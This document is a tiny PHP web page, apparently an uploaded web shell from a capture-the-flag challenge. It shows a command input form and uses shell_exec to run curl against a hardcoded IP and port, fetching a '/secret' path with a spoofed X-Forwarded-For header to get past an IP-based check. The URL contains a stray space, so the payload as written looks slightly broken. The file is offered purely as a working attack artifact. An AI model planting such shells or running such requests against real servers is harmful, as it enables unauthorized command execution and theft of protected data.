<html>
<body style="background:red">

<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
</form>
<pre>
<?php

    echo shell_exec('curl -H "X-Forwarded-For: 167.99.82.136" http:// 167.99.82.136:31740/secret');
?>
</pre>
</body>
</html>